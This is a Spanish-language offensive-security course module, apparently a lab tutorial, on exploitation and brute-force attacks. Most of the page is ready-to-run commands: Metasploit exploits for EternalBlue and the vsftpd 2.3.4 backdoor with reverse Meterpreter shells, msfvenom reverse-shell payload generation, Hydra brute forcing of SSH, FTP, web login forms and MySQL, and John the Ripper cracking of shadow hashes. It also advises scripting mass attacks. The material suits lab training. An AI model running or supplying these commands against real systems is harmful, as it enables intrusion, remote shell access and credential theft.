
# 💥 Explotación de Vulnerabilidades y Ataques de Fuerza Bruta

Este módulo se enfoca en la explotación de vulnerabilidades conocidas utilizando herramientas como Metasploit y técnicas de fuerza bruta con Hydra, John The Ripper y otras. Aprenderás a detectar servicios vulnerables y realizar ataques efectivos tanto en sistemas Windows como Linux.

---

## 🔗 Enlace Alternativo de Descarga de los Laboratorios

Si tienes problemas para acceder a los laboratorios desde la plataforma principal, puedes utilizar enlaces alternativos proporcionados por los instructores o alojados en sitios de respaldo. Asegúrate de verificar que los archivos provienen de fuentes confiables antes de ejecutarlos.

---

## 💣 Uso Básico de Metasploit – Explotación EternalBlue en Windows

EternalBlue (MS17-010) es una vulnerabilidad en SMBv1. Se puede explotar con Metasploit.

### 🛠️ Comando básico:
```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOST <IP_VICTIMA>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <IP_ATACANTE>
exploit
```

---

## 🐧 Uso Básico de Metasploit – Explotación vsftpd en Linux

`vsftpd 2.3.4` tiene una vulnerabilidad de backdoor en modo anónimo.

```bash
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST <IP_VICTIMA>
set RPORT 21
exploit
```

---

## 🧬 Msvenom – Generar Nuestros Propios Payloads

Msfvenom permite generar payloads personalizados para múltiples plataformas.

### 🐍 Ejemplo: Payload en Python para Linux
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f elf > shell.elf
```

### 🪟 Ejemplo: Payload .exe para Windows
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f exe > shell.exe
```

---

## 🔓 Uso de Hydra – Ataques de Fuerza Bruta a Contraseñas (SSH y FTP)

### 🔐 SSH:
```bash
hydra -l root -P rockyou.txt ssh://192.168.1.10
```

### 📁 FTP:
```bash
hydra -l admin -P wordlist.txt ftp://192.168.1.20
```

---

## 👤 Uso de Hydra – Ataques de Fuerza Bruta a Usuarios (SSH y FTP)

Si tienes una lista de usuarios y una sola contraseña:

```bash
hydra -L users.txt -p password123 ssh://192.168.1.10
```

---

## 🌐 Uso de Hydra – Ataques de Fuerza Bruta a Paneles de Login Web

```bash
hydra -l admin -P rockyou.txt 192.168.1.30 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=error"
```

> Cambia la URL y parámetros según el formulario real del sitio.

---

## 🎯 Ataques de Fuerza Bruta con Metasploit

Metasploit tiene módulos auxiliares para bruteforce:

```bash
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.10
set USERNAME root
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
```

---

## 🧵 Ataques de Fuerza Bruta contra Bases de Datos

Ejemplo con MySQL:

```bash
hydra -L users.txt -P passwords.txt 192.168.1.50 mysql
```

También puedes usar herramientas específicas como `sqlmap`.

---

## 🧠 Ataques de Fuerza Bruta en Local con John The Ripper

Si tienes un hash de una contraseña:

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Puedes obtener hashes desde archivos `/etc/shadow`, bases de datos, dumps, etc.

---

📌 Recomendaciones:

- Usa wordlists efectivas como `rockyou.txt` o crea las tuyas.
- Automatiza tareas con scripts si haces ataques en masa.
- No hagas ataques reales fuera de laboratorios o entornos controlados.

---

📚 Recursos útiles:

- https://www.rapid7.com/db/modules/
- https://tools.kali.org/password-attacks/hydra
- man john, man hydra, man msfvenom

---

💡 “No es cuestión de fuerza, es cuestión de probar hasta encontrar la combinación correcta.”
